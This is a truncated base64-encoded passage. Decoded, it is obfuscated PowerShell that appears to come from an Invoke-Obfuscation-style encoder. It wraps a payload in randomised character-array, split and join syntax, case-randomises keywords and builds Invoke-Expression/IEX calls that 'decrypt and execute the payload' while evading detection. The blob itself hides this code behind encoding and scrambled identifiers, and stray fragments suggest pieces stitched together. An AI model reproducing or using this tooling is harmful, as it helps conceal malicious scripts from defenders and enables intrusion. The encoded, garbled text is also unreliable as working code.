lLV1JHbCgnW1N0cmluZ10nKSkgICAgICAgICAgICB8IEZvckVhY2gtT2JqZWN0IHskR19VT1RxNnhnID0gJF8uVG9TdHJpbmcoKS5Ub0xvd2VyKCk7IElmKEdldC1SYW5kb20gLUlucHV0IEAoMC4uKDIgLSAxKSkpIHskR191b1RRNlhHID0gJEdfdW90UTZYZy5Ub1VwcGVyKCl9ICRHX1VPVFE2WGd9KSAtSm9pbiAnJwogICAgJGhYSTdZa0EyVjhOR2ZhNWdBICAgICAgICAgID0gKFtDaGFyW11dKHd1SkpFWUNJR2NJS1dSZ2woJy1Kb2luJykpICAgICAgICAgICAgICAgfCBGb3JFYWNoLU9iamVjdCB7JEdfdU90UTZ4ZyA9ICRfLlRvU3RyaW5nKCkuVG9Mb3dlcigpOyBJZihHZXQtUmFuZG9tIC1JbnB1dCBAKCgxIC0gKDIgLSAxKSkuLigyIC0gMSkpKSB7JEdfdW90UTZ4RyA9ICRnX1VvdFE2eEcuVG9VcHBlcigpfSAkZ19VT3RRNlhnfSkgLUpvaW4gJycKICAgICRweFNuU1ZZSkdMbGdjWGEgICAgICAgPSAoW0NoYXJbXV0od1VKSkV5Y2lnQ0lrV1JnTCgnQ2hhcicpKSAgICAgICAgICAgICAgICB8IEZvckVhY2gtT2JqZWN0IHskZ19VT1RRNlhnID0gJF8uVG9TdHJpbmcoKS5Ub0xvd2VyKCk7IElmKEdldC1SYW5kb20gLUlucHV0IEAoMC4uKC0xICsgMikpKSB7JEdfVW9UUTZYZyA9ICRnX1VvVFE2WGcuVG9VcHBlcigpfSAkZ191T3RxNlhnfSkgLUpvaW4gJycKICAgICRESjQydGg3REtHSUxoQ0t4cnggICAgICAgICAgID0gKFtDaGFyW11dKHd1SmpFWUNpR2NJS3dyZ0woJ0ludCcpKSAgICAgICAgICAgICAgICAgfCBGb3JFYWNoLU9iamVjdCB7JGdfVU9UcTZYRyA9ICRfLlRvU3RyaW5nKCkuVG9Mb3dlcigpOyBJZihHZXQtUmFuZG9tIC1JbnB1dCBAKDAuLjEpKSB7JGdfdU90UTZYRyA9ICRHX1VPVFE2WGcuVG9VcHBlcigpfSAkR191b3RRNnhnfSkgLUpvaW4gJycKICAgICRBcktTWnVybTlEWTE3ID0gKFtDaGFyW11dJEFyS3NadVJNOWR5MTcgICAgICAgIHwgRm9yRWFjaC1PYmplY3QgeyRnX1VvdFE2eEcgPSAkXy5Ub1N0cmluZygpLlRvTG93ZXIoKTsgSWYoR2V0LVJhbmRvbSAtSW5wdXQgQCgwLi4xKSkgeyRHX1VvVFE2WEcgPSAkR19Vb1RxNnhHLlRvVXBwZXIoKX0gJEdfdW90UTZYZ30pIC1Kb2luICcnCiAgICAkU3hpcmZUNmY2NTVxRGhuTyAgICAgICA9IChbQ2hhcltdXSh3VUpKRVlDSWdjSUtXckdsKCdbQ29udmVydF06OlRvSW50MTYoJykpIHwgRm9yRWFjaC1PYmplY3QgeyRHX1VvdFE2WEcgPSAkXy5Ub1N0cmluZygpLlRvTG93ZXIoKTsgSWYoR2V0LVJhbmRvbSAtSW5wdXQgQCgwLi4oMCArIDEpKSkgeyRHX1VvdFE2WGcgPSAkR19Vb3RxNlhHLlRvVXBwZXIoKX0gJEdfVU90UTZYR30pIC1Kb2luICcnCgogICAgIyBDcmVhdGUgcHJpbnRhYmxlIHZlcnNpb24gb2YgJFJhbmRvbURlbGltaXRlcnMgaW4gcmFuZG9tIG9yZGVyIHRvIGJlIHVzZWQgYnkgZmluYWwgY29tbWFuZCBzcGVjaWZpY2FsbHkgZm9yIC1TcGxpdCBzeW50YXguCiAgICAkTGJYb2M4MTdFM0FMcjYxbE4gPSAod3VKakV5Q0lHQ0lLd3JHbCgnJykpCiAgICBGb3JFYWNoKCRWa1hBUTlwekZVTkh2NVBzQ2w2ZXUgaW4gJGF2VnM4WTEya3Rtd19kNSkKICAgIHsKICAgICAgICAjIFJhbmRvbSBjYXNlICdzcGxpdCcgc3RyaW5nLgogICAgICAgICRtM2ZkRHZvaEFiYmxCID0gKFtDaGFyW11dKFd1SkpFWUNpZ2NJa1dyZ2woJ1NwbGl0JykpIHwgRm9yRWFjaC1PYmplY3QgeyRHX1VvdFE2WGcgPSAkXy5Ub1N0cmluZygpLlRvTG93ZXIoKTsgSWYoR2V0LVJhbmRvbSAtSW5wdXQgQCgoKC0xICsgMikgLSAxKS4uMSkpIHskR19VT3RxNlhHID0gJEdfdW9UcTZYRy5Ub1VwcGVyKCl9ICRHX1VvVFE2WGd9KSAtSm9pbiAnJwoKICAgICAgICAkbEJ4b2M4MTdFM0FscjYxTE4gKz0gKChXVUpKRVlDSWdDaWtXUkdsKCctJykpICsgJE0zZmRkdm9IYUJCTGIgKyAnICcqKEdldC1SYW5kb20gLUlucHV0IEAoKDEgLSAxKSwxKSkgKyAod3VKamVZQ0lHY0lLd1JnTCgnJycpKSArICRSYW5kb21EZWxpbWl0ZXIgKyAnJycgKyAnICcqKEdldC1SYW5kb20gLUlucHV0IEAoMCwxKSkpCiAgICB9CiAgICAkTGJ4b2M4MTdlM0FMUjYxTE4gPSAkbEJ4T2M4MTdlM0FMUjYxTG4uVHJpbSgpCiAgICAKICAgICMgUmFuZG9tbHkgc2VsZWN0IGJldHdlZW4gdmFyaW91cyBjb252ZXJzaW9uIHN5bnRheCBvcHRpb25zLgogICAgJENiSWRaTDZRVmRzID0gKFtDaGFyW11dKEdldC1SYW5kb20gLUlucHV0IEAoKHd1SkpleUNpZ2NJS1dyR2woJ1tTdHJpbmddJF8nKSksKCd7Mn17M317MX17MH0nLWYnKScsJ2luZygnLCckXy5UJywnb1N0cicpKSkgfCBGb3JFYWNoLU9iamVjdCB7JEdfdW9UcTZYRyA9ICRfLlRvU3RyaW5nKCkuVG9Mb3dlcigpOyBJZihHZXQtUmFuZG9tIC1JbnB1dCBAKCgwICsgMCkuLigtMSArIDIpKSkgeyRHX3VPVHE2WEcgPSAkR19Vb3RxNlhHLlRvVXBwZXIoKX0gJEdfVW90UTZ4Z30pIC1Kb2luICcnCiAgICAkUHc5SmNpSVA2YkVsSiAgPSBAKCkKICAgICRQVzlKY0lJUDZiRWxKICs9ICh3dWpKRVlDaUdDaWt3ckdsKCdbJENoYXJTdHJdJykpICsgJyAnKihHZXQtUmFuZG9tIC1JbnB1dCBAKDAsKDEgKyAwKSkpICsgKHd1akpFeUNJZ2NJa1dSZ2woJygnKSkgKyAod1VKSkVZQ0lHQ0lrV1JHbCgnICcpKSooR2V0LVJhbmRvbSAtSW5wdXQgQCgoMSAtICgtMSArIDIpKSwoMiAtIDEpKSkgKyAkc3hJckZUNmY2NTVxREhubyArICcgJyooR2V0LVJhbmRvbSAtSW5wdXQgQCgwLCgzIC0gMikpKSArICh3dUpKRVlDSUdDaUt3UkdsKCcoJykpICsgKHd1SkpFWUNJR0NJS1dSZ2woJyAnKSkqKEdldC1SYW5kb20gLUlucHV0IEAoKCgxIC0gMSkgKyAwKSwoMyAtIDIpKSkgKyAkY2JpRFpsNnFWRFMgKyAnICcqKEdldC1SYW5kb20gLUlucHV0IEAoMCwoMCArIDEpKSkgKyAoV3VqSmV5Q0lHQ2lrV3JHTCgnKScpKSArICh3VUpKRVlDaWdjSUtXcmdsKCcgJykpKihHZXQtUmFuZG9tIC1JbnB1dCBAKDAsKDIgLSAxKSkpICsgKHd1ampFeUNJZ0NpS1dSZ2woJywnKSkgKyAkZ01kX2pPOEljaVAgKyAnICcqKEdldC1SYW5kb20gLUlucHV0IEAoMCwxKSkgKyAoV3VqSkVZQ0lnQ0lrV3JHbCgnKScpKSArIChXdWpKRXljSWdDSWtXcmdMKCcgJykpKihHZXQtUmFuZG9tIC1JbnB1dCBAKCgxIC0gMSksMSkpICsgKHd1akpFeUNpR0Npa3dyZ2woJyknKSkKICAgICRwVzlKY2lJUDZiRWxqICs9ICRTWGlSZlQ2ZjY1NXFESE5PICsgJyAnKihHZXQtUmFuZG9tIC1JbnB1dCBAKDAsMSkpICsgKHd1SkplWUNJZ0Npa1dyR0woJygnKSkgKyAoV3VqSkV5Y2lHY2lrd3JHbCgnICcpKSooR2V0LVJhbmRvbSAtSW5wdXQgQCgoMSAtIDEpLDEpKSArICRjYklEWmw2cVZkcyArICcgJyooR2V0LVJhbmRvbSAtSW5wdXQgQCgoMSAtIDEpLCgtKDIgLSAxKSArICgyICsgMCkpKSkgKyAoV3VKSkVZQ2lnY0lLV3JnbCgnKScpKSArIChXdUpKZVlDSUdjaUt3UkdsKCcgJykpKihHZXQtUmFuZG9tIC1JbnB1dCBAKCgxIC0gMSksKDEgKyAwKSkpICsgKHd1SmplWWNJZ0NJS3dyR0woJywnKSkgKyAoV3VKSkVZQ0lHQ0lLd1JHTCgnICcpKSooR2V0LVJhbmRvbSAtSW5wdXQgQCgoMCArICgxIC0gMSkpLCgyIC0gMSkpKSArICRHbWRfSk84SWNJUCArICcgJyooR2V0LVJhbmRvbSAtSW5wdXQgQCgwLCgyIC0gMSkpKSArICh3VUpKRXlDSUdjaUtXcmdsKCcpJykpICsgKFd1SkplWUNpR2NpS1dSZ2woJyAnKSkqKEdldC1SYW5kb20gLUlucHV0IEAoMCwoKDYgLSAzKSAtIDIpKSkgKyAoR2V0LVJhbmRvbSAtSW5wdXQgQCgod3VKamVZQ0lnQ0lLV3JnbCgnLWFzJykpLCh3dUpqRVlDaUdjSWt3cmdsKCctQXMnKSksKFd1SkpFWWNJR2Npa3dyZ2woJy1hUycpKSwod3VqakV5Q0lHQ0lLV3JnbCgnLUFTJykpKSkgKyAod1VKamVZQ0lHQ0lrd3JnTCgnICcpKSooR2V0LVJhbmRvbSAtSW5wdXQgQCgoMSAtIDEpLDEpKSArICh3dUpqZVlDaWdDaUtXckdMKCdbJENoYXJTdHJdJykpCiAgICAkUFc5amNJaXA2YkVsSiA9IChHZXQtUmFuZG9tIC1JbnB1dCAkUFc5SmNJaVA2QkVsSikKCiAgICAjIENyZWF0ZSBhcnJheSBzeW50YXggZm9yIGVuY29kZWQgJFNjcmlwdFN0cmluZyBhcyBhbHRlcm5hdGl2ZSB0byAuU3BsaXQvLVNwbGl0IHN5bnRheC4KICAgICRqcTJlUUNEV0RSUTVSNGhDU1V0dCA9IChXdUpqRVlDSUdjSWt3cmdMKCcnKSkKICAgIChbQ2hhcltdXSRRN3hhcU5xMXk4OGUpIHwgRm9yRWFjaC1PYmplY3QgewogICAgICAgICMgRW5jYXBzdWxhdGUgY3VycmVudCBpdGVtIHdpdGggc2luZ2xlIHF1b3RlIGlmIGl0IGNvbnRhaW5zIGEgbm9uLWludGVnZXIuCiAgICAgICAgSWYoW0NvbnZlcnRdOjpUb1N0cmluZygoW0ludF1bQ2hhcl0kXyksJGdtZF9qbzhJQ2lQKS5UcmltKCh3dWpqZVlDaUdjaUtXUmdMKCcwMTIzNDU2Nzg5JykpKS5MZW5ndGggLWd0ICgxIC0gMSkpIHskZFFsanVURWZzOTFiVEJSSkhmQlogPSAod3VKamVZQ2lnQ0lLd1JnbCgnJycpKX0KICAgICAgICBFbHNlIHskUXVvdGUgPSAoVDNpOVQ1ZWpJYlhtMURueWUzTUVGYzVzMGllcDFVTzJmKCcnKSl9CiAgICAgICAgJEVuY29kZWRBcnJheSArPSAoJFF1b3RlICsgW0NvbnZlcnRdOjpUb1N0cmluZygoW0ludF1bQ2hhcl0kXyksJEVuY29kaW5nQmFzZSkgKyAkUXVvdGUgKyAnICcqKEdldC1SYW5kb20gLUlucHV0IEAoMCwxKSkgKyAodDNJOVQ1ZWppYlhtMWROeUUzbWVmYzVzMGlFUDFVbzJGKCcsJykpICsgKFQzSTlUNWVKSUJ4bTFETnlFM21FZkM1UzBpZXAxVW8yZignICcpKSooR2V0LVJhbmRvbSAtSW5wdXQgQCgwLDEpKSkKICAgIH0KICAgICJAQCIgICAgCiAgICAjIFJlbW92ZSB0cmFpbGluZyBjb21tYSBmcm9tICRFbmNvZGVkQXJyYXkuCiAgICAkRW5jb2RlZEFycmF5ID0gKChUM2k5dDVlaklCWE0xRG55RTNtRWZjNVMwSWVwMVVPMmYoJygnKSkgKyAoVDNpOVQ1RWpJQnhtMURuWWUzTUVmYzVTMGlFcDFVTzJmKCcgJykpKihHZXQtUmFuZG9tIC1JbnB1dCBAKDAsMSkpICsgJEVuY29kZWRBcnJheS5UcmltKCkuVHJpbSgodDNJOXQ1RWppYnhtMURueWUzbUVGYzVzMGlFcDFVTzJGKCcsJykpKSArIChUM0k5dDVlSmlieE0xZG55RTNtZWZjNXMwSWVQMVVPMkYoJyknKSkpCgogICAgIyBtKCkgcmFuZG9tIHN5bnRheCB0byBjcmVhdGUvc2V0IE9GUyB2YXJpYWJsZSAoJE9GUyBpcyB0aGUgT3V0cHV0IEZpZWxkIFNlcGFyYXRvciBhdXRvbWF0aWMgdmFyaWFibGUpLgogICAgIyBVc2luZyBTZXQtSXRlbSBhbmQgU2V0LVZhcmlhYmxlL1NWL1NFVCBzeW50YXguIE5vdCB1c2luZyBOZXctSXRlbSBpbiBjYXNlIE9GUyB2YXJpYWJsZSBhbHJlYWR5IGV4aXN0cy4KICAgICMgSWYgdGhlIE9GUyB2YXJpYWJsZSBkaWQgZXhpc3RzIHRoZW4gd2UgY291bGQgdXNlIGV2ZW4gbW9yZSBzeW50YXg6ICR2YXJuYW1lLCBTZXQtVmFyaWFibGUvU1YsIFNldC1JdGVtL1NFVCwgR2V0LVZhcmlhYmxlL0dWL1ZhcmlhYmxlLCBHZXQtQ2hpbGRJdGVtL0dDSS9DaGlsZEl0ZW0vRGlyL0xzCiAgICAjIEZvciBtb3JlIGluZm86IGh0dHBzOi8vbXNkbi5taWNyb3NvZnQuY29tL2VuLXVzL3Bvd2Vyc2hlbGwvcmVmZXJlbmNlLzUuMS9taWNyb3NvZnQucG93ZXJzaGVsbC5jb3JlL2Fib3V0L2Fib3V0X2F1dG9tYXRpY192YXJpYWJsZXMKICAgICRTZXRPZnNWYXJTeW50YXggICAgICA9IEAoKQogICAgJFNldE9mc1ZhclN5bnRheCAgICAgKz0gKFQzaTl0NUVqaUJ4bTFETnllM01lRmM1UzBpRXAxdW8yRignU2V0LUl0ZW0nKSkgKyAoVDNJOXQ1RUppQnhNMURueUUzbUVGYzVzMElFUDFVTzJGKCcgJykpKihHZXQtUmFuZG9tIC1JbnB1dCBAKDEsMikpICsgKHQzaTl0NWVqSWJ4bTFETnlFM01FZmM1UzBpRXAxVU8yZignJ1ZhcmlhYmxlOk9GUycnKSkgKyAodDNJOXQ1ZUpJQnhtMURuWUUzbWVmYzVTMEllcDF1TzJmKCcgJykpKihHZXQtUmFuZG9tIC1JbnB1dCBAKDEsMikpICsgKFQzaTl0NWVqSWJ4bTFEbnlFM21FZmM1czBpRXAxVU8yRignJycnKSkKICAgICRTZXRPZnNWYXJTeW50YXggICAgICs9IChHZXQtUmFuZG9tIC1JbnB1dCBAKChUM0k5dDVlSmliWG0xRE55RTNtRWZDNVMwSUVwMVVvMmYoJ1NldC1WYXJpYWJsZScpKSwoVDNJOVQ1ZUppYnhtMURueUUzTUVmYzVTMGlFcDFVbzJmKCdTVicpKSwoVDNJOVQ1RUpJQnhNMUROeUUzTUVmYzVzMGlFUDFVTzJmKCdTRVQnKSkpKSArIChUM0k5dDVFSklCeE0xZE55RTNtRWZjNVMwSUVQMVVPMmYoJyAnKSkqKEdldC1SYW5kb20gLUlucHV0IEAoMSwyKSkgKyAodDNJOXQ1RUpJYnhNMWROeUUzTUVmYzVzMGlFUDFVbzJmKCcnT0ZTJycpKSArIChUM0k5VDVlakliWE0xRE55ZTNtRUZjNVMwaUVwMVVPMmYoJyAnKSkqKEdldC1SYW5kb20gLUlucHV0IEAoMSwyKSkgKyAoVDNJOXQ1ZUpJQlhNMWRueUUzbUVmYzVzMGlFUDF1TzJGKCcnJycpKQogICAgJFNldE9mc1ZhciAgICAgICAgICAgID0gKEdldC1SYW5kb20gLUlucHV0ICRTZXRPZnNWYXJTeW50YXgpCgoiQAokY0o1RjZRd3dEam5IY2hacSA9IEAiCiAkU2V0T2ZzVmFyQmFja1N5bnRheCAgPSBAKCkKICAgICRTZXRPZnNWYXJCYWNrU3ludGF4ICs9IChUM2k5dDVlSklCeG0xRE5ZRTNtZWZDNVMwaUVwMXVPMmYoJ1NldC1JdGVtJykpICsgKHQzSTlUNWVKSWJYTTFETnlFM21lZmM1czBpRXAxVW8yZignICcpKSooR2V0LVJhbmRvbSAtSW5wdXQgQCgxLDIpKSArIChUM0k5VDVlaklCeE0xRG55RTNNRWZjNXMwaUVwMVVvMkYoJydWYXJpYWJsZTpPRlMnJykpICsgKHQzaTl0NWVqaUJ4bTFEbnlFM01lRmM1UzBJRXAxVU8yZignICcpKSooR2V0LVJhbmRvbSAtSW5wdXQgQCgxLDIpKSArICh0M2k5dDVlamlCeG0xRG55RTNtRUZjNXMwaWVQMVVPMkYoJycgJycpKQogICAgJFNldE9mc1ZhckJhY2tTeW50YXggKz0gKEdldC1SYW5kb20gLUlucHV0IEAoKHQzSTl0NWVKaUJ4bTFEbnlFM21FRmM1czBJRXAxVW8yRignU2V0LVZhcmlhYmxlJykpLChUM2k5VDVlSmliWG0xRG55RTNtRWZjNXMwaUVwMXVvMkYoJ1NWJykpLChUM0k5dDVlaklieE0xRG5ZZTNtRUZDNXMwaWVwMVVvMmYoJ1NFVCcpKSkpICsgKHQzSTl0NWVqSWJYbTFEbnlFM01lZkM1czBpRXAxVU8yRignICcpKSooR2V0LVJhbmRvbSAtSW5wdXQgQCgxLDIpKSArIChUM0k5dDVFamlCeE0xZE5ZRTNtRUZDNXMwaWVwMXVPMkYoJydPRlMnJykpICsgKFQzaTl0NWVqaWJ4bTFEbnlFM01FZmM1UzBJRVAxdU8yZignICcpKSooR2V0LVJhbmRvbSAtSW5wdXQgQCgxLDIpKSArIChUM2k5VDVFamlCeE0xRE55RTNNZUZDNXMwSUVwMVVPMmYoJycgJycpKQogICAgJFNldE9mc1ZhckJhY2sgICAgICAgID0gKEdldC1SYW5kb20gLUlucHV0ICRTZXRPZnNWYXJCYWNrU3ludGF4KQoKICAgICMgUmFuZG9taXplIGNhc2Ugb2YgJFNldE9mc1ZhciBhbmQgJFNldE9mc1ZhckJhY2suCiAgICAkU2V0T2ZzVmFyICAgICAgICAgICAgPSAoW0NoYXJbXV0kU2V0T2ZzVmFyICAgICB8IEZvckVhY2gtT2JqZWN0IHskQ2hhciA9ICRfLlRvU3RyaW5nKCkuVG9Mb3dlcigpOyBJZihHZXQtUmFuZG9tIC1JbnB1dCBAKDAuLjEpKSB7JENoYXIgPSAkQ2hhci5Ub1VwcGVyKCl9ICRDaGFyfSkgLUpvaW4gJycKICAgICRTZXRPZnNWYXJCYWNrICAgICAgICA9IChbQ2hhcltdXSRTZXRPZnNWYXJCYWNrIHwgRm9yRWFjaC1PYmplY3QgeyRDaGFyID0gJF8uVG9TdHJpbmcoKS5Ub0xvd2VyKCk7IElmKEdldC1SYW5kb20gLUlucHV0IEAoMC4uMSkpIHskQ2hhciA9ICRDaGFyLlRvVXBwZXIoKX0gJENoYXJ9KSAtSm9pbiAnJwoKICAgICMgbSgpIHRoZSBjb2RlIHRoYXQgd2lsbCBkZWNyeXB0IGFuZCBleGVjdXRlIHRoZSBwYXlsb2FkIGFuZCByYW5kb21seSBzZWxlY3Qgb25lLgogICAgJEJhc2VTY3JpcHRBcnJheSAgPSBAKCkKICAgICRCYXNlU2NyaXB0QXJyYXkgKz0gKHQzSTlUNUVqSUJYbTFEbnlFM21FRmM1UzBJZVAxVW8yZignKCcpKSArICh0M0k5VDVlSmlieG0xRG5ZZTNNRWZjNVMwaUVwMXVPMkYoJyAnKSkqKEdldC1SYW5kb20gLUlucHV0IEAoMCwxKSkgKyAodDNJOXQ1ZWpJYnhtMURueUUzTUVmYzVzMElFcDFVTzJmKCcnJykpICsgJHhOVGoydzgxdmogKyAoJ3swfSctZicnLicpICsgJFNwbGl0ICsgJygnICsgKHQzSTlUNWVKaUJ4TTFkblllM21FRmM1czBpZXAxVU8yZignICcpKSooR2V0LVJhbmRvbSAtSW5wdXQgQCgwLDEpKSArIChUM0k5dDVlSklieE0xZG55RTNtRWZDNXMwaUVwMXVPMkYoJycnKSkgKyAkcE9TR0p6VCArICcnJyArICcgJyooR2V0LVJhbmRvbSAtSW5wdXQgQCgwLDEpKSArIChUM2k5dDVFSmlieG0xRE55ZTNtZWZjNXMwSWVwMVVPMmYoJyknKSkgKyAoVDNpOXQ1ZWppYnhtMURueUUzbWVGYzVTMGlFcDFVbzJmKCcgJykpKihHZXQtUmFuZG9tIC1JbnB1dCBAKDAsMSkpICsgKFQzaTlUNWVqSWJYTTFETllFM21FRkM1czBJRXAxdU8yRignfCcpKSArIChUM2k5VDVlaklieG0xZG5ZZTNtRWZjNVMwaUVQMVVPMmYoJyAnKSkqKEdldC1SYW5kb20gLUlucHV0IEAoMCwxKSkgKyAkRm9yRWFjaE9iamVjdCArICcgJyooR2V0LVJhbmRvbSAtSW5wdXQgQCgwLDEpKSArIChUM0k5dDVlamliWG0xZE5ZZTNtRWZjNXMwaUVwMVVPMkYoJ3snKSkgKyAodDNJOXQ1ZWpJYnhtMWRueWUzbWVGQzVzMGlFcDF1bzJGKCcgJykpKihHZXQtUmFuZG9tIC1JbnB1dCBAKDAsMSkpICsgKHQzaTl0NUVKSUJ4bTFEbnlFM21lZkM1czBpZXAxdU8yRignKCcpKSArIChUM2k5dDVlSklCeE0xZG55RTNtRUZDNXMwaUVwMVVPMmYoJyAnKSkqKEdldC1SYW5kb20gLUlucHV0IEAoMCwxKSkgKyAkUmFuZG9tQ29udmVyc2lvblN5bnRheCArICcpJyArICAnICcqKEdldC1SYW5kb20gLUlucHV0IEAoMCwxKSkgKyAoVDNpOXQ1ZWppQlhtMURueWUzTUVmQzVTMGlFcDFVbzJmKCd9JykpICsgKHQzSTl0NWVqaUJ4TTFETnlFM21lRmM1czBJRXAxVU8yZignICcpKSooR2V0LVJhbmRvbSAtSW5wdXQgQCgwLDEpKSArIChUM0k5dDVlSklCeG0xZG5ZRTNtRUZjNXMwaUVwMVVvMkYoJyknKSkKICAgICRCYXNlU2NyaXB0QXJyYXkgKz0gKHQzSTlUNWVqSUJYbTFkTnlFM01FRmM1czBJZXAxdU8yRignKCcpKSArIChUM2k5dDVFaklCeG0xRE55RTNNZUZjNVMwaUVwMXVvMmYoJyAnKSkqKEdldC1SYW5kb20gLUlucHV0IEAoMCwxKSkgKyAoVDNJOXQ1ZWpJQlhtMWROWUUzbWVmYzVTMGlFUDFVTzJmKCcnJykpICsgJFhOVEoydzgxdmogKyAnJycgKyAnICcqKEdldC1SYW5kb20gLUlucHV0IEAoMCwxKSkgKyAkUmFuZG9tRGVsaW1pdGVyc1RvUHJpbnRGb3JEYXNoU3BsaXQgKyAnICcqKEdldC1SYW5kb20gLUlucHV0IEAoMCwxKSkgKyAodDNJOXQ1ZWpJYnhtMURuWUUzTUVmQzVzMEllcDFVTzJmKCd8JykpICsgKFQzSTl0NWVqaUJ4TTFETlllM21FRmM1czBJRVAxdW8yRignICcpKSooR2V0LVJhbmRvbSAtSW5wdXQgQCgwLDEpKSArICRGb3JFYWNoT2JqZWN0ICsgJyAnKihHZXQtUmFuZG9tIC1JbnB1dCBAKDAsMSkpICsgKHQzaTlUNWVqaUJYTTFkbllFM21FZmM1czBpRXAxdW8yZigneycpKSArIChUM2k5dDVlSklieG0xZG5ZRTNNRUZDNXMwaUVQMXVvMmYoJyAnKSkqKEdldC1SYW5kb20gLUlucHV0IEAoMCwxKSkgKyAoVDNJOXQ1ZUpJQnhNMWRuWUUzTWVmYzVzMEllUDFVTzJmKCcoJykpICsgKHQzaTl0NUVKSUJ4bTFEbnlFM21FZmM1czBJZVAxdU8yRignICcpKSooR2V0LVJhbmRvbSAtSW5wdXQgQCgwLDEpKSArICRSYW5kb21Db252ZXJzaW9uU3ludGF4ICsgJyknICsgICcgJyooR2V0LVJhbmRvbSAtSW5wdXQgQCgwLDEpKSArIChUM0k5dDVlSkliWG0xZG55RTNNRWZjNXMwaUVwMVVPMmYoJ30nKSkgKyAoVDNJOXQ1RWpJQnhNMWRueUUzbUVGYzVzMGllcDF1bzJmKCcgJykpKihHZXQtUmFuZG9tIC1JbnB1dCBAKDAsMSkpICsgKFQzSTl0NUVKaUJ4bTFEbnlFM21FZmM1czBpZVAxVU8yZignKScpKQogICAgJEJhc2VTY3JpcHRBcnJheSArPSAodDNJOXQ1ZUpJYnhtMURueUUzbUVGYzVzMElFUDF1TzJmKCcoJykpICsgKFQzaTl0NWVqSUJ4TTFEbnlFM21lZmM1czBpZXAxVW8yZignICcpKSooR2V0LVJhbmRvbSAtSW5wdXQgQCgwLDEpKSArICRFbmNvZGVkQXJyYXkgKyAnICcqKEdldC1SYW5kb20gLUlucHV0IEAoMCwxKSkgKyAoVDNJOVQ1ZWppYlhtMURueUUzbUVGYzVTMEllcDFVTzJmKCd8JykpICsgKHQzSTlUNWVqSUJ4TTFEbnllM21FZmM1czBpZXAxVU8yZignICcpKSooR2V0LVJhbmRvbSAtSW5wdXQgQCgwLDEpKSArICRGb3JFYWNoT2JqZWN0ICsgJyAnKihHZXQtUmFuZG9tIC1JbnB1dCBAKDAsMSkpICsgKFQzSTl0NUVKaUJ4TTFETnlFM21lZmM1czBJZXAxdU8yZigneycpKSArIChUM2k5VDVlSklCWE0xZG55RTNtRWZDNXMwSUVwMVVPMkYoJyAnKSkqKEdldC1SYW5kb20gLUlucHV0IEAoMCwxKSkgKyAodDNJOXQ1ZWppYnhNMURuWWUzbUVmYzVTMGlFcDFVTzJmKCcoJykpICsgKFQzaTl0NUVKSUJYbTFkTnlFM21FZmM1UzBJZXAxVW8yZignICcpKSooR2V0LVJhbmRvbSAtSW5wdXQgQCgwLDEpKSArICRSYW5kb21Db252ZXJzaW9uU3ludGF4ICsgJyknICsgICcgJyooR2V0LVJhbmRvbSAtSW5wdXQgQCgwLDEpKSArIChUM0k5VDVlamliWG0xRE55RTNtRWZjNVMwSWVQMVVPMmYoJ30nKSkgKyAoVDNJOXQ1ZUppQlhtMURueUUzbUVmQzVzMGllcDFVTzJmKCcgJykpKihHZXQtUmFuZG9tIC1JbnB1dCBAKDAsMSkpICsgKFQzSTlUNUVKaUJ4TTFEbnlFM01lRmM1czBpRVAxdU8yZignKScpKQogICAgIkBAIgogICAgIyBtKCkgcmFuZG9tIEpPSU4gc3ludGF4IGZvciBhbGwgYWJvdmUgb3B0aW9ucy4KICAgICROZXdTY3JpcHRBcnJheSAgID0gQCgpCiAgICAkTmV3U2NyaXB0QXJyYXkgICs9IChHZXQtUmFuZG9tIC1JbnB1dCAkQmFzZVNjcmlwdEFycmF5KSArICcgJyooR2V0LVJhbmRvbSAtSW5wdXQgQCgwLDEpKSArICRKb2luICsgJyAnKihHZXQtUmFuZG9tIC1JbnB1dCBAKDAsMSkpICsgKHQzSTl0NWVqSUJ4bTFkTnllM21FRkM1czBpRVAxVU8yZignJycnKSkKICAgICROZXdTY3JpcHRBcnJheSAgKz0gJEpvaW4gKyAnICcqKEdldC1SYW5kb20gLUlucHV0IEAoMCwxKSkgKyAoR2V0LVJhbmRvbSAtSW5wdXQgJEJhc2VTY3JpcHRBcnJheSkKICAgICROZXdTY3JpcHRBcnJheSAgKz0gJFN0ckpvaW4gKyAnKCcgKyAoVDNJOXQ1ZUppQnhtMUROWUUzbWVmYzVzMGllcDFVbzJmKCcgJykpKihHZXQtUmFuZG9tIC1JbnB1dCBAKDAsMSkpICsgKHQzSTl0NWVqaUJYbTFkbllFM01lZmM1UzBpZVAxVW8yRignJycnKSkgKyAoVDNJOVQ1ZWpJYnhNMURueWUzTWVGYzVzMGlFUDF1TzJmKCcgJykpKihHZXQtUmFuZG9tIC1JbnB1dCBAKDAsMSkpICsgKFQzSTl0NWVKSUJYTTFkbnlFM01FZmM1czBJZVAxVU8yZignLCcpKSArIChUM0k5VDVlaklCWE0xRG55ZTNtZWZjNVMwaWVQMVVvMmYoJyAnKSkqKEdldC1SYW5kb20gLUlucHV0IEAoMCwxKSkgKyAoR2V0LVJhbmRvbSAtSW5wdXQgJEJhc2VTY3JpcHRBcnJheSkgKyAnICcqKEdldC1SYW5kb20gLUlucHV0IEAoMCwxKSkgKyAodDNJOVQ1ZWpJYnhtMWRueUUzTUVGQzVzMGlFcDFVTzJmKCcpJykpCgogICAgIyBSYW5kb21seSBzZWxlY3Qgb25lIG9mIHRoZSBhYm92ZSBjb21tYW5kcy4KICAgICROZXdTY3JpcHQgPSAoR2V0LVJhbmRvbSAtSW5wdXQgJE5ld1NjcmlwdEFycmF5KQogICAgIkBAIgogICAgIyBtKCkgcmFuZG9tIGludm9rZSBvcGVyYXRpb24gc3ludGF4LgogICAgIyBCZWxvdyBjb2RlIGJsb2NrIGlzIGEgY29weSBmcm9tIE91dC1PYmZ1c2NhdGVkU3RyaW5nQ29tbWFuZC5wczEuIEl0IGlzIGNvcGllZCBpbnRvIHRoaXMgZW5jb2RpbmcgZnVuY3Rpb24gc28gdGhhdCB0aGlzIHdpbGwgcmVtYWluIGEgc3RhbmRhbG9uZSBzY3JpcHQgd2l0aG91dCBkZXBlbmRlbmNpZXMuCiAgICAkSW52b2tlRXhwcmVzc2lvblN5bnRheCAgPSBAKCkKICAgICRJbnZva2VFeHByZXNzaW9uU3ludGF4ICs9IChHZXQtUmFuZG9tIC1JbnB1dCBAKCh0M0k5dDVlaklieE0xZG55RTNNRWZjNXMwaUVwMXVPMmYoJ0lFWCcpKSwoVDNJOXQ1ZWpJYlhtMURueUUzbUVGQzVzMGllcDFVTzJmKCdJbnZva2UtRXhwcmVzc2lvbicpKSkpCiAgICAjIEFkZGVkIGJlbG93IHNsaWdodGx5LXJhbmRvbWl6ZW